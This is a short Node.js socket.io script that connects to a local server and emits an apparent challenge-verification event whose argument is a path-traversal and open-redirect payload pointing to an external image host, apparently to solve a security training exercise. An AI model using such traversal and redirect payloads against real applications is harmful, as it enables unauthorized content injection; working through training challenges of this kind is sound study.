const io = require('socket.io-client');
const socket = io('http://localhost:3000', { transports: ['websocket', 'polling'] });

socket.on('connect', () => {
    console.log('Connected');
    socket.emit('verifySvgInjectionChallenge', '../../../assets/redirect?to=https://placekitten.com/200/300');
    
    setTimeout(() => {
        console.log('Done emitting');
        socket.close();
    }, 2000);
});
